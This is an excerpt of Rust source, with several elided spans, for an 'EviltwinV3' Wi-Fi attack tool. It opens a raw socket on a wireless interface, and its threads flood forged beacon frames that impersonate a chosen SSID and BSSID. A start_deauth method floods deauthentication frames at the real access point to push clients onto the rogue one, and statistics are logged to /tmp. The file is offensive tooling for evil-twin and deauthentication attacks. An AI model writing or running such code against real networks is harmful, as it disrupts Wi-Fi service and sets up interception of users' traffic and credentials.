...
impl EviltwinV3 {
    pub fn new(iface: &str, ssid: &str, bssid: &str, channel: u8) -> Option<Self> {
        ...
        let r = running.clone();
        let s = sent.clone();
        let r_stats = running.clone();
        let s_stats = sent.clone();
        let iface_own = iface.to_string();
        let ssid_own = ssid.to_string();
        let bssid_own = bssid.to_string();
        let iface_stats = iface.to_string();
        let ssid_stats = ssid.to_string();
        let bssid_stats = bssid.to_string();

        // Stats thread
        thread::spawn(move || {
            while r_stats.load(Ordering::Relaxed) {
                let total = s_stats.load(Ordering::Relaxed);
                ...
                if let Ok(json_str) = serde_json::to_string(&stats) {
                    let _ = std::fs::write("/tmp/eviltwin_v3.json", &json_str);
                }
        ...
        let handle = thread::spawn(move || {
            let sock = match crate::raw_injector::RawSocket::open(&iface_own) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[EviltwinV3] Socket error: {}", e);
                    return;
                }
            };
            ...
            while r.load(Ordering::Relaxed) {
                ...
                if sock.send(&frame).is_ok() {
                    ...
                    if total % 1000 == 0 {
                        eprintln!("[EviltwinV3] beacon {} total={}", bssid_own, total);
                    }
                }
            }
        });
    ...
    pub fn start_deauth(&mut self, real_bssid: String) {
        ...
        self.deauth_handle = Some(thread::spawn(move || {
            ...
            while r.load(Ordering::Relaxed) {
                ...
                if total % 2000 == 0 {
                    eprintln!("[EviltwinV3] deauth {} total={}", bssid_own, total);
                }
            }
        }));
    }
